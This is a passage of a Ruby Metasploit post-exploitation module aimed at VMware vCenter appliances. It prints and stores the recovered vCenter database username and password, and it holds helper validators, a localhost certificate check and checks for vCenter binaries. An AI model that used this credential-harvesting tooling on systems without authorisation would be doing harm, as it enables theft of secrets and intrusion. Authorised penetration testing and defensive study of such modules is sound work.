    print_good("\tVCDB User: #{@vcdb_user}")
    print_good("\tVCDB Pass: #{@vcdb_pass}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 5432,
      service_name: 'psql',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @vcdb_name
    }

    store_valid_credential(user: @vcdb_user, private: @vcdb_pass, service_data: extra_service_data)
  end

  def validate_uuid(uuid)
    uuid_regex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
    return true if uuid_regex.match?(uuid.to_s.downcase)

    false
  end

  def validate_ipv4(ipv4)
    ip = IPAddr.new ipv4.to_s
    unless ip
      return false
    end

    true
  end

  def validate_fqdn(fqdn)
    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/
    return true if fqdn_regex.match?(fqdn.to_s.downcase)

    false
  end

  def validate_dn(dn)
    dn_regex = /^(?:(?<cn>cn=(?<name>[^,]*)),)?(?:(?<path>(?:(?:cn|ou)=[^,]+,?)+),)?(?<domain>(?:dc=[^,]+,?)+)$/
    return true if dn_regex.match?(dn.to_s.downcase)

    false
  end

  def validate_sts_cert(test_cert)
    unless (cert = OpenSSL::X509::Certificate.new(test_cert))
      fail_with(Msf::Exploit::Failure::Unknown, 'Invalid x509 certificate received')
    end

    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter ...')

    idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{@base_fqdn}/certificates?scope=TENANT")

    unless idm_cmd != ''
      print_error('Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM')
      return false
    end

    if (idm_json = JSON.parse(idm_cmd).first)
      idm_json['certificates'].each do |idm|
        unless (cert_verify = OpenSSL::X509::Certificate.new(idm['encoded']))
          print_error('Invalid x509 certificate extracted from IDM!')
          return false
        end
        unless cert == cert_verify
          next
        end

        return true
      end
    else
      print_error('Unable to parse IDM tenant certificates downloaded from http://localhost:7080/idm/tenant/ on local vCenter')
      return false
    end

    print_error('No vSphere IDM tenant certificates returned from http://localhost:7080/idm/tenant/')
    false
  end

  def validate_target
    unless command_exists?('/usr/sbin/vpxd')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/sbin/vpxd (is this host a vCenter appliance?)')
    end

    unless command_exists?('/usr/lib/vmware-vmafd/bin/vmafd-cli')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/lib/vmware-vmafd/bin/vmafd-cli')
    end

    unless command_exists?('/usr/lib/vmware-vmafd/bin/vecs-cli')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/lib/vmware-vmafd/bin/vecs-cli')
    end

    unless command_exists?('/opt/likewise/bin/lwregshell')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/likewise/bin/lwregshell')
    end

    unless command_exists?('/opt/likewise/bin/ldapsearch')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/likewise/bin/ldapsearch')
    end

    unless command_exists?('/opt/vmware/vpostgres/current/bin/psql')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/vmware/vpostgres/current/bin/psql')
    end

    @vcsa_build = cmd_exec('/usr/sbin/vpxd -v').split("\n").last
    print_status(@vcsa_build)
  end

end
